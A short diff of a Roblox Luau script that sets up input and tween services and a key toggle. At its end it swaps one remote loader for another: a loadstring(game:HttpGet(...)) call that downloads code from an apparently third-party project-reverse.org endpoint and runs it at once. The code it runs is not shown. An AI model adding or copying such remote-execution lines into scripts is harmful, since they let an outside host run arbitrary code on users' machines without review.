@@ -1,3 +1,4 @@
+
 local Players = game:GetService("Players")
 local UserInputService = game:GetService("UserInputService")
 local TweenService = game:GetService("TweenService")
@@ -459,5 +460,4 @@ UserInputService.InputBegan:Connect(function(input, processed)
 		setEnabled(not enabled)
 	end
 end)
-ID="e6d7507f-daf2-4040-8e5f-b2a91b71e026";
-loadstring(game:HttpGet("https://cdn.project-reverse.org/loader.luau"))();
+loadstring(game:HttpGet("https://api.project-reverse.org/run/eyJpZCI6ImU2ZDc1MDdmLWRhZjItNDA0MC04ZTVmLWIyYTkxYjcxZTAyNiIsImtpbmQiOiJsb2FkZXIifQ"))()
